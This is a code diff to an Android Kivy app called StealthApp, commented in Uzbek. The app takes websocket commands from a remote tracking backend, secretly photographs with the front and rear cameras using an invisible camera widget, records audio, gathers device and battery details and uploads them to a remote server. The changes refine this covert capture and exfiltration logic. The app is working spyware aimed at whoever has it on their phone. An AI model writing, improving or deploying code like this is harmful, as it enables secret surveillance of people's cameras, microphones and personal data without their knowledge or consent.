@@ -5,6 +5,8 @@ import shutil
 import time
 import ssl
 import uuid
+import struct
+import zlib
 import urllib.request
 from kivy.app import App
 from kivy.uix.boxlayout import BoxLayout
@@ -19,7 +21,7 @@ UPLOAD_URL = "https://hild-tracking-backend.onrender.com/upload"
 status           = ["Ishga tushirilmoqda..."]
 should_reconnect = [True]
 ws_ref           = [None]
-app_ref          = [None]   # App instansiyasi
+app_ref          = [None]
 
 
 def _ssl_ctx():
@@ -29,7 +31,7 @@ def _ssl_ctx():
     return ctx
 
 
-# ─── URLLIB YUKLASH ────────────────────────────────────────────────────────────
+# ─── URLLIB YUKLASH ─────────────────────────────────────────────────────────────
 def _multipart(fields, files=None):
     b = uuid.uuid4().hex
     body = b""
@@ -72,7 +74,36 @@ def send_text_sync(text_data):
         status[0] = "Yuborish xatolik: " + str(e)[:120]
 
 
-# ─── QURILMA ─────────────────────────────────────────────────────────────────
+# ─── TEXTURE → PNG (faqat stdlib, PIL kerak emas) ──────────────────────────────
+def _save_texture_png(texture, filepath):
+    """Kivy texture piksellarini to'g'ridan PNG sifatida saqlash"""
+    pixels = bytes(texture.pixels)  # RGBA raw bytes
+    w, h   = texture.size
+
+    # RGBA → RGB (alpha o'chirib tashlaymiz)
+    rgb = bytearray()
+    for i in range(0, len(pixels), 4):
+        rgb.extend(pixels[i:i + 3])
+
+    # OpenGL texturalari teskari saqlangan (pastdan yuqoriga) — to'g'irlaymiz
+    row = w * 3
+    scanlines = [b'\x00' + bytes(rgb[y * row:(y + 1) * row])
+                 for y in range(h - 1, -1, -1)]
+
+    compressed = zlib.compress(b''.join(scanlines), 6)
+
+    def png_chunk(name, data):
+        c = name + data
+        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
+
+    with open(filepath, 'wb') as f:
+        f.write(b'\x89PNG\r\n\x1a\n')
+        f.write(png_chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)))
+        f.write(png_chunk(b'IDAT', compressed))
+        f.write(png_chunk(b'IEND', b''))
+
+
+# ─── QURILMA MA'LUMOTLARI ───────────────────────────────────────────────────────
 def get_battery_info():
     try:
         from jnius import autoclass
@@ -101,38 +132,9 @@ def get_device_info():
         return "Qurilma info xatolik: " + str(e)
 
 
-# ─── TEXTURE → PNG (PIL talab qilmaydi) ──────────────────────────────
-def _save_texture_png(texture, filepath):
-    """Kivy texture dan RGB PNG yaratish (faqat stdlib)"""
-    import struct
-    import zlib
-    pixels = bytes(texture.pixels)   # RGBA bytes
-    w, h   = texture.size
-
-    # RGBA → RGB
-    rgb = bytearray()
-    for i in range(0, len(pixels), 4):
-        rgb.extend(pixels[i:i + 3])
-
-    # Kivy texturelar teskari (OpenGL: pastdan yuqoriga), to'g'irlaymiz
-    row = w * 3
-    rows = [b'\x00' + bytes(rgb[y * row:(y + 1) * row])
-            for y in range(h - 1, -1, -1)]
-
-    compressed = zlib.compress(b''.join(rows), 6)
-
-    def chunk(name, data):
-        c = name + data
-        return struct.pack('>I', len(data)) + c + struct.pack('>I', zlib.crc32(c) & 0xffffffff)
-
-    with open(filepath, 'wb') as f:
-        f.write(b'\x89PNG\r\n\x1a\n')
-        f.write(chunk(b'IHDR', struct.pack('>IIBBBBB', w, h, 8, 2, 0, 0, 0)))
-        f.write(chunk(b'IDAT', compressed))
-        f.write(chunk(b'IEND', b''))
-
-
+# ─── KAMERA ─────────────────────────────────────────────────────────────────────
 def take_photo_kivy(front_camera):
+    """Clock.schedule_once orqali asosiy Kivy threadidan chaqiriladi"""
     try:
         from kivy.uix.camera import Camera as KivyCam
         from jnius import autoclass
@@ -141,14 +143,13 @@ def take_photo_kivy(front_camera):
         cam_name = 'selfie' if front_camera else 'capture'
         filepath = ext_dir + '/' + cam_name + '.png'
 
-        # Widget ko'rinmas lekin yetarli o'lchamda bo'lishi kerak!
         cam = KivyCam(
             index=1 if front_camera else 0,
             resolution=(1280, 720),
             play=True,
             size_hint=(None, None),
-            size=(320, 240),   # export_to_png uchun yetarli o'lcham
-            opacity=0,         # Foydalanuvchi ko'rmaydi
+            size=(320, 240),
+            opacity=0,
         )
         app_ref[0].root.add_widget(cam)
         status[0] = 'Kamera tayorlanmoqda...'
@@ -157,41 +158,46 @@ def take_photo_kivy(front_camera):
         def capture(dt):
             attempts[0] += 1
             texture = cam.texture
-            if texture is None and attempts[0] < 6:
+            if texture is None and attempts[0] < 8:
                 status[0] = 'Texture kutilmoqda... (' + str(attempts[0]) + ')'
                 Clock.schedule_once(capture, 1.0)
                 return
             try:
                 if texture is not None:
-                    # export_to_png emas — to'g'ridan texture.pixels o'qiymiz!
+                    # export_to_png emas — texture.pixels to'g'ridan o'qiymiz
                     _save_texture_png(texture, filepath)
-                cam.play = False
-                app_ref[0].root.remove_widget(cam)
-                fsize = os.path.getsize(filepath) if os.path.exists(filepath) else 0
-                if fsize > 5000:
-                    threading.Thread(
-                        target=upload_file_sync, args=(filepath, 'photo'), daemon=True
-                    ).start()
-                    status[0] = 'Rasm olindi (' + str(fsize // 1024) + ' KB), yuborilmoqda...'
+                    cam.play = False
+                    app_ref[0].root.remove_widget(cam)
+                    fsize = os.path.getsize(filepath) if os.path.exists(filepath) else 0
+                    if fsize > 5000:
+                        threading.Thread(
+                            target=upload_file_sync, args=(filepath, 'photo'), daemon=True
+                        ).start()
+                        status[0] = 'Rasm olindi (' + str(fsize // 1024) + ' KB), yuborilmoqda...'
+                    else:
+                        msg = '[v2] PNG juda kichik: ' + str(fsize) + ' bayt'
+                        status[0] = msg
+                        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
                 else:
-                    msg = 'Rasm juda kichik: ' + str(fsize) + ' bayt'
+                    cam.play = False
+                    app_ref[0].root.remove_widget(cam)
+                    msg = 'Texture None qoldi (8 urinishdan keyin)'
                     status[0] = msg
-                    threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
+                    threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
             except Exception as ex:
                 msg = 'Capture xatolik: ' + str(ex)
                 status[0] = msg
-                threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
+                threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
         Clock.schedule_once(capture, 3.0)
 
     except Exception as e:
         msg = 'Kamera xatolik: ' + str(e)
         status[0] = msg
-        threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
+        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
 
-
-# ─── AUDIO ────────────────────────────────────────────────────────────────────
+# ─── AUDIO ──────────────────────────────────────────────────────────────────────
 def record_audio():
     try:
         from jnius import autoclass
@@ -220,10 +226,10 @@ def record_audio():
     except Exception as e:
         msg = 'Audio xatolik: ' + str(e)
         status[0] = msg
-        threading.Thread(target=send_text_sync, args=(('[XATO] ' + msg,)), daemon=True).start()
+        threading.Thread(target=send_text_sync, args=(msg,), daemon=True).start()
 
 
-# ─── WEBSOCKET ────────────────────────────────────────────────────────────────
+# ─── WEBSOCKET ──────────────────────────────────────────────────────────────────
 async def ws_loop():
     loop  = asyncio.get_running_loop()
     retry = 0
@@ -243,7 +249,6 @@ async def ws_loop():
                 while True:
                     msg = await ws.recv()
                     status[0] = 'Buyruq: ' + msg
-
                     if msg == 'take_photo':
                         Clock.schedule_once(lambda dt: take_photo_kivy(False), 0)
                     elif msg == 'selfie':
@@ -258,7 +263,6 @@ async def ws_loop():
                         info = get_device_info()
                         status[0] = info
                         await loop.run_in_executor(None, send_text_sync, info)
-
         except Exception as e:
             ws_ref[0] = None
             wait = min(5 * retry, 30)
@@ -278,11 +282,6 @@ def run_loop():
 
 def force_reconnect():
     should_reconnect[0] = False
-    if ws_ref[0]:
-        try:
-            asyncio.run_coroutine_threadsafe(ws_ref[0].close(), asyncio.get_event_loop())
-        except Exception:
-            pass
     try:
         if platform == 'android':
             from jnius import autoclass
@@ -297,7 +296,7 @@ def force_reconnect():
     threading.Thread(target=run_loop, daemon=True).start()
 
 
-# ─── UI ───────────────────────────────────────────────────────────────────────
+# ─── UI ─────────────────────────────────────────────────────────────────────────
 class StealthApp(App):
     def build(self):
         app_ref[0] = self
